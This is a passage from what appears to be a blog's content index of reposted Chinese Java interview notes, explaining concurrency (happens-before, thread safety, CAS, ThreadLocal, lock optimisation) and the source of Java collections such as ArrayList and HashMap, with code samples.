内存模型中，允许编译器和处理器对指令进行重排序，重排序过程不会影响到单线程程序的执行，却会影响到多线程并发执行的正确性。 volatile 关键字通过添加内存屏障的方式来禁止指令重排，即重排序时不能把后面的指令放到内存屏障之前。 也可以通过 synchronized 来保证有序性，它保证每个时刻只有一个线程执行同步代码，相当于是让线程顺序执行同步代码。 先行发生原则上面提到了可以用 volatile 和 synchronized 来保证有序性。除此之外，JVM 还规定了先行发生原则，让一个操作无需控制就能先于另一个操作完成。 主要有以下这些原则： 1. 单一线程原则 Single Thread rule 在一个线程内，在程序前面的操作先行发生于后面的操作。 2. 管程锁定规则 Monitor Lock Rule 一个 unlock 操作先行发生于后面对同一个锁的 lock 操作。 3. volatile 变量规则 Volatile Variable Rule 对一个 volatile 变量的写操作先行发生于后面对这个变量的读操作。 4. 线程启动规则 Thread Start Rule Thread 对象的 start() 方法调用先行发生于此线程的每一个动作。 5. 线程加入规则 Thread Join Rule join() 方法返回先行发生于 Thread 对象的结束。 6. 线程中断规则 Thread Interruption Rule 对线程 interrupt() 方法的调用先行发生于被中断线程的代码检测到中断事件的发生，可以通过 Thread.interrupted() 方法检测到是否有中断发生。 7. 对象终结规则 Finalizer Rule 一个对象的初始化完成（构造函数执行结束）先行发生于它的 finalize() 方法的开始。 8. 传递性 Transitivity 如果操作 A 先行发生于操作 B，操作 B 先行发生于操作 C，那么操作 A 先行发生于操作 C。 十一、线程安全线程安全定义一个类在可以被多个线程安全调用时就是线程安全的。 线程安全分类线程安全不是一个非真即假的命题，可以将共享数据按照安全程度的强弱顺序分成以下五类：不可变、绝对线程安全、相对线程安全、线程兼容和线程对立。 1. 不可变不可变（Immutable）的对象一定是线程安全的，无论是对象的方法实现还是方法的调用者，都不需要再采取任何的线程安全保障措施，只要一个不可变的对象被正确地构建出来，那其外部的可见状态永远也不会改变，永远也不会看到它在多个线程之中处于不一致的状态。 不可变的类型： final 关键字修饰的基本数据类型； String 枚举类型 Number 部分子类，如 Long 和 Double 等数值包装类型，BigInteger 和 BigDecimal 等大数据类型。但同为 Number 的子类型的原子类 AtomicInteger 和 AtomicLong 则并非不可变的。 对于集合类型，可以使用 Collections.unmodifiableXXX() 方法来获取一个不可变的集合。 1234567public class ImmutableExample &#123; public static void main(String[] args) &#123; Map&lt;String, Integer&gt; map = new HashMap&lt;&gt;(); Map&lt;String, Integer&gt; unmodifiableMap = Collections.unmodifiableMap(map); unmodifiableMap.put("a", 1); &#125;&#125; 123Exception in thread "main" java.lang.UnsupportedOperationException at java.util.Collections$UnmodifiableMap.put(Collections.java:1457) at ImmutableExample.main(ImmutableExample.java:9) Collections.unmodifiableXXX() 先对原始的集合进行拷贝，需要对集合进行修改的方法都直接抛出异常。 123public V put(K key, V value) &#123; throw new UnsupportedOperationException();&#125; 多线程环境下，应当尽量使对象成为不可变，来满足线程安全。 2. 绝对线程安全不管运行时环境如何，调用者都不需要任何额外的同步措施。 3. 相对线程安全相对的线程安全需要保证对这个对象单独的操作是线程安全的，在调用的时候不需要做额外的保障措施，但是对于一些特定顺序的连续调用，就可能需要在调用端使用额外的同步手段来保证调用的正确性。 在 Java 语言中，大部分的线程安全类都属于这种类型，例如 Vector、HashTable、Collections 的 synchronizedCollection() 方法包装的集合等。 对于下面的代码，如果删除元素的线程删除了一个元素，而获取元素的线程试图访问一个已经被删除的元素，那么就会抛出 ArrayIndexOutOfBoundsException。 1234567891011121314151617181920212223public class VectorUnsafeExample &#123; private static Vector&lt;Integer&gt; vector = new Vector&lt;&gt;(); public static void main(String[] args) &#123; while (true) &#123; for (int i = 0; i &lt; 100; i++) &#123; vector.add(i); &#125; ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; &#123; for (int i = 0; i &lt; vector.size(); i++) &#123; vector.remove(i); &#125; &#125;); executorService.execute(() -&gt; &#123; for (int i = 0; i &lt; vector.size(); i++) &#123; vector.get(i); &#125; &#125;); executorService.shutdown(); &#125; &#125;&#125; 12345Exception in thread "Thread-159738" java.lang.ArrayIndexOutOfBoundsException: Array index out of range: 3 at java.util.Vector.remove(Vector.java:831) at VectorUnsafeExample.lambda$main$0(VectorUnsafeExample.java:14) at VectorUnsafeExample$$Lambda$1/713338599.run(Unknown Source) at java.lang.Thread.run(Thread.java:745) 如果要保证上面的代码能正确执行下去，就需要对删除元素和获取元素的代码进行同步。 1234567891011121314executorService.execute(() -&gt; &#123; synchronized (vector) &#123; for (int i = 0; i &lt; vector.size(); i++) &#123; vector.remove(i); &#125; &#125;&#125;);executorService.execute(() -&gt; &#123; synchronized (vector) &#123; for (int i = 0; i &lt; vector.size(); i++) &#123; vector.get(i); &#125; &#125;&#125;); 4. 线程兼容线程兼容是指对象本身并不是线程安全的，但是可以通过在调用端正确地使用同步手段来保证对象在并发环境中可以安全地使用，我们平常说一个类不是线程安全的，绝大多数时候指的是这一种情况。Java API 中大部分的类都是属于线程兼容的，如与前面的 Vector 和 HashTable 相对应的集合类 ArrayList 和 HashMap 等。 5. 线程对立线程对立是指无论调用端是否采取了同步措施，都无法在多线程环境中并发使用的代码。由于 Java 语言天生就具备多线程特性，线程对立这种排斥多线程的代码是很少出现的，而且通常都是有害的，应当尽量避免。 线程安全的实现方法1. 互斥同步synchronized 和 ReentrantLock。 2. 非阻塞同步互斥同步最主要的问题就是进行线程阻塞和唤醒所带来的性能问题，因此这种同步也称为阻塞同步（Blocking Synchronization）。 从处理问题的方式上说，互斥同步属于一种悲观的并发策略，总是认为只要不去做正确的同步措施（例如加锁），那就肯定会出现问题，无论共享数据是否真的会出现竞争，它都要进行加锁（这里讨论的是概念模型，实际上虚拟机会优化掉很大一部分不必要的加锁）、用户态核心态转换、维护锁计数器和检查是否有被阻塞的线程需要唤醒等操作。 随着硬件指令集的发展，我们有了另外一个选择：基于冲突检测的乐观并发策略，通俗地说，就是先进行操作，如果没有其他线程争用共享数据，那操作就成功了；如果共享数据有争用，产生了冲突，那就再采取其他的补偿措施（最常见的补偿措施就是不断地重试，直到成功为止），这种乐观的并发策略的许多实现都不需要把线程挂起，因此这种同步操作称为非阻塞同步（Non-Blocking Synchronization）。 乐观锁需要操作和冲突检测这两个步骤具备原子性，这里就不能再使用互斥同步来保证了，只能靠硬件来完成。硬件支持的原子性操作最典型的是：比较并交换（Compare-and-Swap，CAS）。 CAS 指令需要有 3 个操作数，分别是内存位置（在 Java 中可以简单理解为变量的内存地址，用 V 表示）、旧的预期值（用 A 表示）和新值（用 B 表示）。CAS 指令执行时，当且仅当 V 符合旧预期值 A 时，处理器用新值 B 更新 V 的值，否则它就不执行更新。但是无论是否更新了 V 的值，都会返回 V 的旧值，上述的处理过程是一个原子操作。 J.U.C 包里面的整数原子类 AtomicInteger，其中的 compareAndSet() 和 getAndIncrement() 等方法都使用了 Unsafe 类的 CAS 操作。 在下面的代码 1 中，使用了 AtomicInteger 执行了自增的操作。代码 2 是 incrementAndGet() 的源码，它调用了 unsafe 的 getAndAddInt() 。代码 3 是 getAndAddInt() 源码，var1 指示内存位置，var2 指示新值，var4 指示操作需要加的数值，这里为 1。在代码 3 的实现中，通过 getIntVolatile(var1, var2) 得到旧的预期值。通过调用 compareAndSwapInt() 来进行 CAS 比较，如果 var2=var5，那么就更新内存地址为 var1 的变量为 var5+var4。可以看到代码 3 是在一个循环中进行，发生冲突的做法是不断的进行重试。 123456// 代码 1private AtomicInteger cnt = new AtomicInteger();public void add() &#123; cnt.incrementAndGet();&#125; 1234// 代码 2public final int incrementAndGet() &#123; return unsafe.getAndAddInt(this, valueOffset, 1) + 1;&#125; 123456789// 代码 3public final int getAndAddInt(Object var1, long var2, int var4) &#123; int var5; do &#123; var5 = this.getIntVolatile(var1, var2); &#125; while(!this.compareAndSwapInt(var1, var2, var5, var5 + var4)); return var5;&#125; ABA ：如果一个变量初次读取的时候是 A 值，它的值被改成了 B，后来又被改回为 A，那 CAS 操作就会误认为它从来没有被改变过。J.U.C 包提供了一个带有标记的原子引用类“AtomicStampedReference”来解决这个问题，它可以通过控制变量值的版本来保证 CAS 的正确性。大部分情况下 ABA 问题不会影响程序并发的正确性，如果需要解决 ABA 问题，改用传统的互斥同步可能会比原子类更高效。 3. 无同步方案要保证线程安全，并不是一定就要进行同步，两者没有因果关系。同步只是保证共享数据争用时的正确性的手段，如果一个方法本来就不涉及共享数据，那它自然就无须任何同步措施去保证正确性，因此会有一些代码天生就是线程安全的。 （一）可重入代码（Reentrant Code） 这种代码也叫做纯代码（Pure Code），可以在代码执行的任何时刻中断它，转而去执行另外一段代码（包括递归调用它本身），而在控制权返回后，原来的程序不会出现任何错误。相对线程安全来说，可重入性是更基本的特性，它可以保证线程安全，即所有的可重入的代码都是线程安全的，但是并非所有的线程安全的代码都是可重入的。 可重入代码有一些共同的特征，例如不依赖存储在堆上的数据和公用的系统资源、用到的状态量都由参数中传入、不调用非可重入的方法等。我们可以通过一个简单的原则来判断代码是否具备可重入性：如果一个方法，它的返回结果是可以预测的，只要输入了相同的数据，就都能返回相同的结果，那它就满足可重入性的要求，当然也就是线程安全的。 （二）栈封闭 多个线程访问同一个方法的局部变量时，不会出现线程安全问题，因为局部变量存储在栈中，属于线程私有的。 123456789101112import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;public class StackClosedExample &#123; public void add100() &#123; int cnt = 0; for (int i = 0; i &lt; 100; i++) &#123; cnt++; &#125; System.out.println(cnt); &#125;&#125; 1234567public static void main(String[] args) &#123; StackClosedExample example = new StackClosedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; example.add100()); executorService.execute(() -&gt; example.add100()); executorService.shutdown();&#125; 12100100 （三）线程本地存储（Thread Local Storage） 如果一段代码中所需要的数据必须与其他代码共享，那就看看这些共享数据的代码是否能保证在同一个线程中执行。如果能保证，我们就可以把共享数据的可见范围限制在同一个线程之内，这样，无须同步也能保证线程之间不出现数据争用的问题。 符合这种特点的应用并不少见，大部分使用消费队列的架构模式（如“生产者-消费者”模式）都会将产品的消费过程尽量在一个线程中消费完，其中最重要的一个应用实例就是经典 Web 交互模型中的“一个请求对应一个服务器线程”（Thread-per-Request）的处理方式，这种处理方式的广泛应用使得很多 Web 服务端应用都可以使用线程本地存储来解决线程安全问题。 可以使用 java.lang.ThreadLocal 类来实现线程本地存储功能。 对于以下代码，thread1 中设置 threadLocal 为 1，而 thread2 设置 threadLocal 为 2。过了一段时间之后，thread1 读取 threadLocal 依然是 1，不受 thread2 的影响。 123456789101112131415161718192021public class ThreadLocalExample &#123; public static void main(String[] args) &#123; ThreadLocal threadLocal = new ThreadLocal(); Thread thread1 = new Thread(() -&gt; &#123; threadLocal.set(1); try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(threadLocal.get()); threadLocal.remove(); &#125;); Thread thread2 = new Thread(() -&gt; &#123; threadLocal.set(2); threadLocal.remove(); &#125;); thread1.start(); thread2.start(); &#125;&#125; 11 为了理解 ThreadLocal，先看以下代码： 12345678910111213141516public class ThreadLocalExample1 &#123; public static void main(String[] args) &#123; ThreadLocal threadLocal1 = new ThreadLocal(); ThreadLocal threadLocal2 = new ThreadLocal(); Thread thread1 = new Thread(() -&gt; &#123; threadLocal1.set(1); threadLocal2.set(1); &#125;); Thread thread2 = new Thread(() -&gt; &#123; threadLocal1.set(2); threadLocal2.set(2); &#125;); thread1.start(); thread2.start(); &#125;&#125; 它所对应的底层结构图为： 每个 Thread 都有一个 ThreadLocal.ThreadLocalMap 对象，Thread 类中就定义了 ThreadLocal.ThreadLocalMap 成员。 123/* ThreadLocal values pertaining to this thread. This map is maintained * by the ThreadLocal class. */ThreadLocal.ThreadLocalMap threadLocals = null; 当调用一个 ThreadLocal 的 set(T value) 方法时，先得到当前线程的 ThreadLocalMap 对象，然后将 ThreadLocal-&gt;value 键值对插入到该 Map 中。 12345678public void set(T value) &#123; Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) map.set(this, value); else createMap(t, value);&#125; get() 方法类似。 12345678910111213public T get() &#123; Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) &#123; ThreadLocalMap.Entry e = map.getEntry(this); if (e != null) &#123; @SuppressWarnings("unchecked") T result = (T)e.value; return result; &#125; &#125; return setInitialValue();&#125; ThreadLocal 从理论上讲并不是用来解决多线程并发问题的，因为根本不存在多线程竞争。在一些场景 (尤其是使用线程池) 下，由于 ThreadLocal.ThreadLocalMap 的底层数据结构导致 ThreadLocal 有内存泄漏的情况，尽可能在每次使用 ThreadLocal 后手动调用 remove()，以避免出现 ThreadLocal 经典的内存泄漏甚至是造成自身业务混乱的风险。 十二、锁优化这里的锁优化主要是指虚拟机对 synchronized 的优化。 自旋锁互斥同步的进入阻塞状态的开销都很大，应该尽量避免。在许多应用中，共享数据的锁定状态只会持续很短的一段时间。自旋锁的思想是让一个线程在请求一个共享数据的锁时执行忙循环（自旋）一段时间，如果在这段时间内能获得锁，就可以避免进入阻塞状态。 自选锁虽然能避免进入阻塞状态从而减少开销，但是它需要进行忙循环操作占用 CPU 时间，它只适用于共享数据的锁定状态很短的场景。 在 JDK 1.6 中引入了自适应的自旋锁。自适应意味着自旋的次数不再固定了，而是由前一次在同一个锁上的自旋次数及锁的拥有者的状态来决定。 锁消除锁消除是指对于被检测出不可能存在竞争的共享数据的锁进行消除。 锁消除主要是通过逃逸分析来支持，如果堆上的共享数据不可能逃逸出去被其它线程访问到，那么就可以把它们当成私有数据对待，也就可以将它们的锁进行消除。 对于一些看起来没有加锁的代码，其实隐式的加了很多锁。例如下面的字符串拼接代码就隐式加了锁： 123public static String concatString(String s1, String s2, String s3) &#123; return s1 + s2 + s3;&#125; String 是一个不可变的类，编译器会对 String 的拼接自动优化。在 JDK 1.5 之前，会转化为 StringBuffer 对象的连续 append() 操作： 1234567public static String concatString(String s1, String s2, String s3) &#123; StringBuffer sb = new StringBuffer(); sb.append(s1); sb.append(s2); sb.append(s3); return sb.toString();&#125; 每个 append() 方法中都有一个同步块。虚拟机观察变量 sb，很快就会发现它的动态作用域被限制在 concatString() 方法内部。也就是说，sb 的所有引用永远不会“逃逸”到 concatString() 方法之外，其他线程无法访问到它，因此可以进行消除。 锁粗化如果一系列的连续操作都对同一个对象反复加锁和解锁，频繁的加锁操作就会导致性能损耗。 上一节的示例代码中连续的 append() 方法就属于这类情况。如果虚拟机探测到由这样的一串零碎的操作都对同一个对象加锁，将会把加锁的范围扩展（粗化）到整个操作序列的外部。对于上一节的示例代码就是扩展到第一个 append() 操作之前直至最后一个 append() 操作之后，这样只需要加锁一次就可以了。 轻量级锁JDK 1.6 引入了偏向锁和轻量级锁，从而让锁拥有了四个状态：无锁状态（unlocked）、偏向锁状态（biasble）、轻量级锁状态（lightweight locked）和重量级锁状态（inflated）。 以下是 HotSpot 虚拟机对象头的内存布局，这些数据被称为 mark word。其中 tag bits 对应了五个状态，这些状态在右侧的 state 表格中给出，应该注意的是 state 表格不是存储在对象头中的。除了 marked for gc 状态，其它四个状态已经在前面介绍过了。 下图左侧是一个线程的虚拟机栈，其中有一部分称为 Lock Record 的区域，这是在轻量级锁运行过程创建的，用于存放锁对象的 Mark Word。而右侧就是一个锁对象，包含了 Mark Word 和其它信息。 轻量级锁是相对于传统的重量级锁而言，它使用 CAS 操作来避免重量级锁使用互斥量的开销。对于绝大部分的锁，在整个同步周期内都是不存在竞争的，因此也就不需要都使用互斥量进行同步，可以先采用 CAS 操作进行同步，如果 CAS 失败了再改用互斥量进行同步。 当尝试获取一个锁对象时，如果锁对象标记为 0 01，说明锁对象的锁未锁定（unlocked）状态。此时虚拟机在当前线程栈中创建 Lock Record，然后使用 CAS 操作将对象的 Mark Word 更新为 Lock Record 指针。如果 CAS 操作成功了，那么线程就获取了该对象上的锁，并且对象的 Mark Word 的锁标记变为 00，表示该对象处于轻量级锁状态。 如果 CAS 操作失败了，虚拟机首先会检查对象的 Mark Word 是否指向当前线程的虚拟机栈，如果是的话说明当前线程已经拥有了这个锁对象，那就可以直接进入同步块继续执行，否则说明这个锁对象已经被其他线程线程抢占了。如果有两条以上的线程争用同一个锁，那轻量级锁就不再有效，要膨胀为重量级锁。 偏向锁偏向锁的思想是偏向于让第一个获取锁对象的线程，这个线程在之后获取该锁就不再需要进行同步操作，甚至连 CAS 操作也不再需要。 当锁对象第一次被线程获得的时候，进入偏向状态，标记为 1 01。同时使用 CAS 操作将线程 ID 记录到 Mark Word 中，如果 CAS 操作成功，这个线程以后每次进入这个锁相关的同步块就不需要再进行任何同步操作。 当有另外一个线程去尝试获取这个锁对象时，偏向状态就宣告结束，此时撤销偏向（Revoke Bias）后恢复到未锁定状态或者轻量级锁状态。 十三、多线程开发良好的实践 给线程起个有意义的名字，这样可以方便找 Bug。 缩小同步范围，例如对于 synchronized，应该尽量使用同步块而不是同步方法。 多用同步类少用 wait() 和 notify()。首先，CountDownLatch, Semaphore, CyclicBarrier 和 Exchanger 这些同步类简化了编码操作，而用 wait() 和 notify() 很难实现对复杂控制流的控制。其次，这些类是由最好的企业编写和维护，在后续的 JDK 中它们还会不断优化和完善，使用这些更高等级的同步工具你的程序可以不费吹灰之力获得优化。 多用并发集合少用同步集合。并发集合比同步集合的可扩展性更好，例如应该使用 ConcurrentHashMap 而不是 Hashtable。 使用本地变量和不可变类来保证线程安全。 使用线程池而不是直接创建 Thread 对象，这是因为创建线程代价很高，线程池可以有效地利用有限的线程来启动任务。 使用 BlockingQueue 实现生产者消费者问题。 参考资料 BruceEckel. Java 编程思想: 第 4 版 [M]. 机械工业出版社, 2007. 周志明. 深入理解 Java 虚拟机 [M]. 机械工业出版社, 2011. Threads and Locks 线程通信 Java 线程面试题 Top 50 BlockingQueue thread state java CSC 456 Spring 2012/ch7 MN Java - Understanding Happens-before relationship 6장 Thread Synchronization How is Java’s ThreadLocal implemented under the hood? Concurrent JAVA FORK JOIN EXAMPLE 聊聊并发（八）——Fork/Join 框架介绍 Eliminating SynchronizationRelated Atomic Operations with Biased Locking and Bulk Rebiasing]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java 容器]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FJava%20%E5%AE%B9%E5%99%A8%2F</url>
    <content type="text"><![CDATA[一、概览 Collection Map 二、容器中的设计模式 迭代器模式 适配器模式 三、源码分析 ArrayList Vector LinkedList HashMap ConcurrentHashMap 参考资料 一、概览容器主要包括 Collection 和 Map 两种，Collection 又包含了 List、Set 以及 Queue。 Collection 1. Set HashSet：基于哈希实现，支持快速查找，但不支持有序性操作，例如根据一个范围查找元素的操作。并且失去了元素的插入顺序信息，也就是说使用 Iterator 遍历 HashSet 得到的结果是不确定的； TreeSet：基于红黑树实现，支持有序性操作，但是查找效率不如 HashSet，HashSet 查找时间复杂度为 O(1)，TreeSet 则为 O(logN)； LinkedHashSet：具有 HashSet 的查找效率，且内部使用链表维护元素的插入顺序。 2. List ArrayList：基于动态数组实现，支持随机访问； Vector：和 ArrayList 类似，但它是线程安全的； LinkedList：基于双向链表实现，只能顺序访问，但是可以快速地在链表中间插入和删除元素。不仅如此，LinkedList 还可以用作栈、队列和双向队列。 3. Queue LinkedList：可以用它来支持双向队列； PriorityQueue：基于堆结构实现，可以用它来实现优先队列。 Map HashMap：基于哈希实现； HashTable：和 HashMap 类似，但它是线程安全的，这意味着同一时刻多个线程可以同时写入 HashTable 并且不会导致数据不一致。它是遗留类，不应该去使用它。现在可以使用 ConcurrentHashMap 来支持线程安全，并且 ConcurrentHashMap 的效率会更高，因为 ConcurrentHashMap 引入了分段锁。 LinkedHashMap：使用链表来维护元素的顺序，顺序为插入顺序或者最近最少使用（LRU）顺序。 TreeMap：基于红黑树实现。 二、容器中的设计模式迭代器模式 Collection 实现了 Iterable 接口，其中的 iterator() 方法能够产生一个 Iterator 对象，通过这个对象就可以迭代遍历 Collection 中的元素。 从 JDK 1.5 之后可以使用 foreach 方法来遍历实现了 Iterable 接口的聚合对象。 123456List&lt;String&gt; list = new ArrayList&lt;&gt;();list.add("a");list.add("b");for (String item : list) &#123; System.out.println(item);&#125; 适配器模式java.util.Arrays#asList() 可以把数组类型转换为 List 类型。 12@SafeVarargspublic static &lt;T&gt; List&lt;T&gt; asList(T... a) 如果要将数组类型转换为 List 类型，应该注意的是 asList() 的参数为泛型的变长参数，因此不能使用基本类型数组作为参数，只能使用相应的包装类型数组。 12Integer[] arr = &#123;1, 2, 3&#125;;List list = Arrays.asList(arr); 也可以使用以下方式生成 List。 1List list = Arrays.asList(1,2,3); 三、源码分析如果没有特别说明，以下源码分析基于 JDK 1.8。 在 IDEA 中 double shift 调出 Search EveryWhere，查找源码文件，找到之后就可以阅读源码。 ArrayList1. 概览实现了 RandomAccess 接口，因此支持随机访问，这是理所当然的，因为 ArrayList 是基于数组实现的。 12public class ArrayList&lt;E&gt; extends AbstractList&lt;E&gt; implements List&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable 数组的默认大小为 10。 1private static final int DEFAULT_CAPACITY = 10; 2. 序列化基于数组实现，保存元素的数组使用 transient 修饰，该关键字声明数组默认不会被序列化。ArrayList 具有动态扩容特性，因此保存元素的数组不一定都会被使用，那么就没必要全部进行序列化。ArrayList 重写了 writeObject() 和 readObject() 来控制只序列化数组中有元素填充那部分内容。 1transient Object[] elementData; // non-private to simplify nested class access 3. 扩容添加元素时使用 ensureCapacityInternal() 方法来保证容量足够，如果不够时，需要使用 grow() 方法进行扩容，新容量的大小为 oldCapacity + (oldCapacity &gt;&gt; 1)，也就是旧容量的 1.5 倍。 扩容操作需要调用 Arrays.copyOf() 把原数组整个复制到新数组中，这个操作代价很高，因此最好在创建 ArrayList 对象时就指定大概的容量大小，减少扩容操作的次数。 12345678910111213141516171819202122232425262728293031public boolean add(E e) &#123; ensureCapacityInternal(size + 1); // Increments modCount!! elementData[size++] = e; return true;&#125;private void ensureCapacityInternal(int minCapacity) &#123; if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123; minCapacity = Math.max(DEFAULT_CAPACITY, minCapacity); &#125; ensureExplicitCapacity(minCapacity);&#125;private void ensureExplicitCapacity(int minCapacity) &#123; modCount++; // overflow-conscious code if (minCapacity - elementData.length &gt; 0) grow(minCapacity);&#125;private void grow(int minCapacity) &#123; // overflow-conscious code int oldCapacity = elementData.length; int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1); if (newCapacity - minCapacity &lt; 0) newCapacity = minCapacity; if (newCapacity - MAX_ARRAY_SIZE &gt; 0) newCapacity = hugeCapacity(minCapacity); // minCapacity is usually close to size, so this is a win: elementData = Arrays.copyOf(elementData, newCapacity);&#125; 4. 删除元素需要调用 System.arraycopy() 将 index+1 后面的元素都复制到 index 位置上。 12345678910public E remove(int index) &#123; rangeCheck(index); modCount++; E oldValue = elementData(index); int numMoved = size - index - 1; if (numMoved &gt; 0) System.arraycopy(elementData, index+1, elementData, index, numMoved); elementData[--size] = null; // clear to let GC do its work return oldValue;&#125; 5. Fail-FastmodCount 用来记录 ArrayList 结构发生变化的次数。结构发生变化是指添加或者删除至少一个元素的所有操作，或者是调整内部数组的大小，仅仅只是设置元素的值不算结构发生变化。 在进行序列化或者迭代等操作时，需要比较操作前后 modCount 是否改变，如果改变了需要抛出 ConcurrentModificationException。 123456789101112131415161718private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException&#123; // Write out element count, and any hidden stuff int expectedModCount = modCount; s.defaultWriteObject(); // Write out size as capacity for behavioural compatibility with clone() s.writeInt(size); // Write out all elements in the proper order. for (int i=0; i&lt;size; i++) &#123; s.writeObject(elementData[i]); &#125; if (modCount != expectedModCount) &#123; throw new ConcurrentModificationException(); &#125;&#125; Vector1. 同步它的实现与 ArrayList 类似，但是使用了 synchronized 进行同步。 12345678910111213public synchronized boolean add(E e) &#123; modCount++; ensureCapacityHelper(elementCount + 1); elementData[elementCount++] = e; return true;&#125;public synchronized E get(int index) &#123; if (index &gt;= elementCount) throw new ArrayIndexOutOfBoundsException(index); return elementData(index);&#125; 2. ArrayList 与 Vector Vector 是同步的，因此开销就比 ArrayList 要大，访问速度更慢。最好使用 ArrayList 而不是 Vector，因为同步操作完全可以由程序员自己来控制； Vector 每次扩容请求其大小的 2 倍空间，而 ArrayList 是 1.5 倍。 3. Vector 替代方案为了获得线程安全的 ArrayList，可以使用 Collections.synchronizedList(); 得到一个线程安全的 ArrayList。 12List&lt;String&gt; list = new ArrayList&lt;&gt;();List&lt;String&gt; synList = Collections.synchronizedList(list); 也可以使用 concurrent 并发包下的 CopyOnWriteArrayList 类。 1List&lt;String&gt; list = new CopyOnWriteArrayList&lt;&gt;(); LinkedList1. 概览基于双向链表实现，内部使用 Node 来存储链表节点信息。 12345private static class Node&lt;E&gt; &#123; E item; Node&lt;E&gt; next; Node&lt;E&gt; prev;&#125; 每个链表存储了 Head 和 Tail 指针： 12transient Node&lt;E&gt; first;transient Node&lt;E&gt; last; 2. ArrayList 与 LinkedList ArrayList 基于动态数组实现，LinkedList 基于双向链表实现； ArrayList 支持随机访问，LinkedList 不支持； LinkedList 在任意位置添加删除元素更快。 HashMap为了便于理解，以下源码分析以 JDK 1.7 为主。 1. 存储结构内部包含了一个 Entry 类型的数组 table。 1transient Entry[] table; 其中，Entry 就是存储数据的键值对，它包含了四个字段。从 next 字段我们可以看出 Entry 是一个链表，即数组中的每个位置被当成一个桶，一个桶存放一个链表，链表中存放哈希值相同的 Entry。也就是说，HashMap 使用拉链法来解决冲突。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465static class Entry&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; &#123; final K key; V value; Entry&lt;K,V&gt; next; int hash; Entry(int h, K k, V v, Entry&lt;K,V&gt; n) &#123; value = v; next = n; key = k; hash = h; &#125; public final K getKey() &#123; return key; &#125; public final V getValue() &#123; return value; &#125; public final V setValue(V newValue) &#123; V oldValue = value; value = newValue; return oldValue; &#125; public final boolean equals(Object o) &#123; if (!(o instanceof Map.Entry)) return false; Map.Entry e = (Map.Entry)o; Object k1 = getKey(); Object k2 = e.getKey(); if (k1 == k2 || (k1 != null &amp;&amp; k1.equals(k2))) &#123; Object v1 = getValue(); Object v2 = e.getValue(); if (v1 == v2 || (v1 != null &amp;&amp; v1.equals(v2))) return true; &#125; return false; &#125; public final int hashCode() &#123; return Objects.hashCode(getKey()) ^ Objects.hashCode(getValue()); &#125; public final String toString() &#123; return getKey() + "=" + getValue(); &#125; /** * This method is invoked whenever the value in an entry is * overwritten by an invocation of put(k,v) for a key k that's already * in the HashMap. */ void recordAccess(HashMap&lt;K,V&gt; m) &#123; &#125; /** * This method is invoked whenever the entry is * removed from the table. */ void recordRemoval(HashMap&lt;K,V&gt; m) &#123; &#125;&#125; 2. 拉链法的工作原理1234HashMap&lt;String, String&gt; map = new HashMap&lt;&gt;();map.put("K1", "V1");map.put("K2", "V2");map.put("K3", "V3"); 新建一个 HashMap，默认大小为 16； 插入 &lt;K1,V1&gt; 键值对，先计算 K1 的 hashCode 为 115，使用除留余数法得到所在的桶下标 115%16=3。 插入 &lt;K2,V2&gt; 键值对，先计算 K2 的 hashCode 为 118，使用除留余数法得到所在的桶下标 118%16=6。 插入 &lt;K3,V3&gt; 键值对，先计算 K3 的 hashCode 为 118，使用除留余数法得到所在的桶下标 118%16=6，插在 &lt;K2,V2&gt; 前面。 应该注意到链表的插入是以头插法方式进行的，例如上面的 &lt;K3,V3&gt; 不是插在 &lt;K2,V2&gt; 后面，而是插入在链表头部。 查找需要分成两步进行： 计算键值对所在的桶； 在链表上顺序查找，时间复杂度显然和链表的长度成正比。 3. put 操作1234567891011121314151617181920212223242526public V put(K key, V value) &#123; if (table == EMPTY_TABLE) &#123; inflateTable(threshold); &#125; // 键为 null 单独处理 if (key == null) return putForNullKey(value); int hash = hash(key); // 确定桶下标 int i = indexFor(hash, table.length); // 先找出是否已经存在键为 key 的键值对，如果存在的话就更新这个键值对的值为 value for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123; Object k; if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123; V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; &#125; &#125; modCount++; // 插入新键值对 addEntry(hash, key, value, i); return null;&#125; HashMap 允许插入键为 null 的键值对。因为无法调用 null 的 hashCode()，也就无法确定该键值对的桶下标，只能通过强制指定一个桶下标来存放。HashMap 使用第 0 个桶存放键为 null 的键值对。 12345678910111213private V putForNullKey(V value) &#123; for (Entry&lt;K,V&gt; e = table[0]; e != null; e = e.next) &#123; if (e.key == null) &#123; V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; &#125; &#125; modCount++; addEntry(0, null, value, 0); return null;&#125; 使用链表的头插法，也就是新的键值对插在链表的头部，而不是链表的尾部。 12345678910111213141516void addEntry(int hash, K key, V value, int bucketIndex) &#123; if ((size &gt;= threshold) &amp;&amp; (null != table[bucketIndex])) &#123; resize(2 * table.length); hash = (null != key) ? hash(key) : 0; bucketIndex = indexFor(hash, table.length); &#125; createEntry(hash, key, value, bucketIndex);&#125;void createEntry(int hash, K key, V value, int bucketIndex) &#123; Entry&lt;K,V&gt; e = table[bucketIndex]; // 头插法，链表头部指向新的键值对 table[bucketIndex] = new Entry&lt;&gt;(hash, key, value, e); size++;&#125; 123456Entry(int h, K k, V v, Entry&lt;K,V&gt; n) &#123; value = v; next = n; key = k; hash = h;&#125; 4. 确定桶下标很多操作都需要先确定一个键值对所在的桶下标。 12int hash = hash(key);int i = indexFor(hash, 